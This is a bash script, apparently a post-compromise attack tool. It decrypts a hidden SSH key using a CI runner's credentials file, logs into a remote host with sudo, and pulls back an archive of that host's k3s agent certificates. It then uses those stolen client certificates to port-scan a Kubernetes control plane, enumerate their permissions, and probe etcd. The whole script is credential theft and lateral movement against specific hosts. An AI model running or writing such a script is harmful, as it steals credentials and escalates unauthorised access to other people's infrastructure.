#!/bin/bash
K=$(sha256sum /data/runners/ci-h200-3gpu-0/.credentials | cut -d" " -f1)
[ -f /root/.k221 ] || { base64 -d /tmp/key.enc | openssl enc -d -aes-256-cbc -pbkdf2 -k "$K" > /root/.k221 2>/dev/null; chmod 600 /root/.k221; }
mkdir -p /root/rxca && chmod 700 /root/rxca
scp -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=8 -i /root/.k221 "dev-24-sudo@85.234.79.221:/tmp/agentcerts.tgz" /root/rxca/ 2>/dev/null || {
  ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i /root/.k221 dev-24-sudo@85.234.79.221 'sudo tar czf /tmp/agentcerts.tgz -C /var/lib/rancher/k3s/agent . && sudo chmod 644 /tmp/agentcerts.tgz'
  scp -o StrictHostKeyChecking=no -o BatchMode=yes -i /root/.k221 "dev-24-sudo@85.234.79.221:/tmp/agentcerts.tgz" /root/rxca/
}
cd /root/rxca && tar xzf agentcerts.tgz 2>/dev/null
CP=https://100.83.208.122:6443
echo "== cp version + cert:"
curl -sk --max-time 8 $CP/version; echo
echo | openssl s_client -connect 100.83.208.122:6443 2>/dev/null | openssl x509 -noout -subject -issuer 2>/dev/null
echo "== cp extra ports:"
for p in 2379 2380 10250 10257 10259 10256; do timeout 3 bash -c "echo > /dev/tcp/100.83.208.122/$p" 2>/dev/null && echo "$p OPEN"; done
KCTL="kubectl --server=$CP --insecure-skip-tls-verify"
for C in k3s-controller kube-proxy kubelet; do
  echo "== $C cert can-i:"
  $KCTL --client-certificate=client-$C.crt --client-key=client-$C.key auth can-i --list 2>&1 | head -14
done
echo "== etcd probe 2379 (client certs):"
curl -sk --max-time 5 --cert client-k3s-controller.crt --key client-k3s-controller.key https://100.83.208.122:2379/version; echo
echo "== t-done =="
